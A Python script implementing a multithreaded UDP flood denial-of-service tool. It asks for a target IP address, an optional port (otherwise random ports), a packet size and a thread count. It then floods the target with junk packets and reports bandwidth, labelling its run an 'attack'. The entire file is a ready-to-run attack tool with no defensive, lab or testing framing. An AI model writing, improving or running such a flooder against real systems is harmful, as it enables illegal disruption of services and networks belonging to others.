from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
import os
from random import randint
from time import time, sleep
from getpass import getpass as hinput

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

class UDPFlooder:
    def __init__(self, ip, port, packet_size, thread_count):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.thread_count = thread_count

        self.client = socket(AF_INET, SOCK_DGRAM)
        self.packet_data = b"x" * self.packet_size
        self.packet_length = len(self.packet_data)

    def start_flood(self):
        self.is_active = True
        self.sent_bytes = 0
        for _ in range(self.thread_count):
            Thread(target=self.send_packets).start()
        Thread(target=self.monitor_traffic).start()

    def stop_flood(self):
        self.is_active = False

    def send_packets(self):
        while self.is_active:
            try:
                self.client.sendto(self.packet_data, (self.ip, self._get_random_port()))
                self.sent_bytes += self.packet_length
            except Exception as e:
                print(f"Error sending packet: {e}")

    def _get_random_port(self):
        return self.port if self.port else randint(1, 65535)

    def monitor_traffic(self):
        interval = 0.05
        start_time = time()
        total_bytes_sent = 0
        while self.is_active:
            sleep(interval)
            current_time = time()
            if current_time - start_time >= 1:
                speed_mbps = self.sent_bytes * 8 / (1024 * 1024) / (current_time - start_time)
                total_bytes_sent += self.sent_bytes
                print(f"Speed: {speed_mbps:.2f} Mb/s - Total: {total_bytes_sent / (1024 * 1024 * 1024):.2f} Gb", end='\r')
                start_time = current_time
                self.sent_bytes = 0

def get_input(prompt, default=None, cast_type=int):
    value = input(prompt)
    if value == '':
        return default
    try:
        return cast_type(value)
    except ValueError:
        print(f"Invalid input. Please enter a valid {cast_type.__name__}.")
        return get_input(prompt, default, cast_type)

def main():
    clear_screen()
    ip = input("Enter the target IP address: ")
    if not ip.count('.') == 3:
        print("Error! Please enter a valid IP address.")
        return

    port = get_input("Enter the target port (or press enter to target all ports): ", default=None, cast_type=int)
    packet_size = get_input("Enter the packet size in bytes (default is 1250): ", default=1250)
    thread_count = get_input("Enter the number of threads (default is 100): ", default=100)

    flooder = UDPFlooder(ip, port, packet_size, thread_count)
    
    try:
        flooder.start_flood()
        print(f"Starting attack on {ip}:{port if port else 'all ports'}")
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        flooder.stop_flood()
        print(f"Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb")

if __name__ == '__main__':
    main()
